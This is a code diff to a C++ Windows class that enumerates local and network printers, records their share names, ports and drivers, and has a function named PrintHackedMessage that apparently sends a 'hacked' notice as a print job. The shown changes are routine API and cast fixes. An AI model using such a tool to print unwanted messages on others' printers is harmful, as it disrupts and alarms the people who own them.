@@ -72,7 +72,7 @@ bool Printers::EnumeratePrintersInformation() {
 	//Allocate memory for LPPRINTER_INFO_2
 	if ((printerInformation = (LPPRINTER_INFO_2)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pcbNeeded)) == 0) exit(EXIT_FAILURE); //Exit Failure if not enough memory is available.
 	//Enum our printers
-	if (EnumPrinters(PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS, NULL, 2, (LPBYTE)printerInformation, pcbNeeded, &pcbNeeded, &pcReturned) == 0) {
+	if (EnumPrintersA(PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS, NULL, 2, (LPBYTE)printerInformation, pcbNeeded, &pcbNeeded, &pcReturned) == 0) {
 		std::cout << "ENUMPRINTERS FAILED WITH ERROR : " << GetLastError() << std::endl;
 		exit(EXIT_FAILURE);
 	}
@@ -80,18 +80,18 @@ bool Printers::EnumeratePrintersInformation() {
 	for (DWORD dwItem = 0; dwItem < pcReturned; dwItem++) {
 		//If printInformation has attributes PRINTER_ATTRIBUTE_SHARED then push it into our struct vector else we push "NONE"
 		Printers.push_back({
-			reinterpretPrinterValueAddress(printerInformation[dwItem].pPrinterName),
-			printerInformation[dwItem].Attributes& PRINTER_ATTRIBUTE_SHARED ? reinterpretPrinterValueAddress(printerInformation[dwItem].pShareName) : "None", //PUSH SHARE NAME
-			reinterpretPrinterValueAddress(printerInformation[dwItem].pPortName),
-			reinterpretPrinterValueAddress(printerInformation[dwItem].pDriverName),
-			reinterpretPrinterValueAddress(printerInformation[dwItem].pComment),
-			reinterpretPrinterValueAddress(printerInformation[dwItem].pLocation),
-			reinterpretPrinterValueAddress(printerInformation[dwItem].pPrintProcessor),
+			reinterpret_cast<char *>(printerInformation[dwItem].pPrinterName),
+			printerInformation[dwItem].Attributes& PRINTER_ATTRIBUTE_SHARED ? reinterpret_cast<char *>(printerInformation[dwItem].pShareName) : "None", //PUSH SHARE NAME
+			reinterpret_cast<char *>(printerInformation[dwItem].pPortName),
+			reinterpret_cast<char *>(printerInformation[dwItem].pDriverName),
+			reinterpret_cast<char *>(printerInformation[dwItem].pComment),
+			reinterpret_cast<char *>(printerInformation[dwItem].pLocation),
+			reinterpret_cast<char *>(printerInformation[dwItem].pPrintProcessor),
 			printerInformation[dwItem].Status,
 			printerInformation[dwItem].cJobs,
 			printerInformation[dwItem].Priority,
 			printerInformation[dwItem].AveragePPM,
-			reinterpretPrinterValueAddress(printerInformation[dwItem].pPrinterName) == this->DefaultPrinterName.c_str() ? true : false
+			reinterpret_cast<char*>(printerInformation[dwItem].pPrinterName) == DefaultPrinterName ? true : false
 			});
 	}
 
@@ -114,7 +114,7 @@ void Printers::PrintHackedMessage(){
 	//Check if we have more than 1 printers in the list.
 	if(this->Printers.size() < 1) return;
 	//Variables
-	LPHANDLE hPrinter;
+	LPHANDLE hPrinter = nullptr;
 	DWORD PrintJob = 0;
 	DOC_INFO_1 docInformations;
 	//Print
